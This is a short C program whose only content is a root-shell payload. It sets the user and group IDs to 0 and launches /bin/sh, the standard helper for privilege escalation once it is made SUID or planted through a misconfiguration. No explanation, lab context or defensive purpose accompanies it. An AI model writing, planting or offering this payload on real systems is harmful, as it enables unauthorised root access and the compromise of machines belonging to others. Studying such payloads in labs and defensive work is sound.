#include <stdlib.h>  // for system
#include <unistd.h>  // for setgid, setuid

int main(void)
{
	setuid(0);
	setgid(0);
	system("/bin/sh");
	return 0;
}
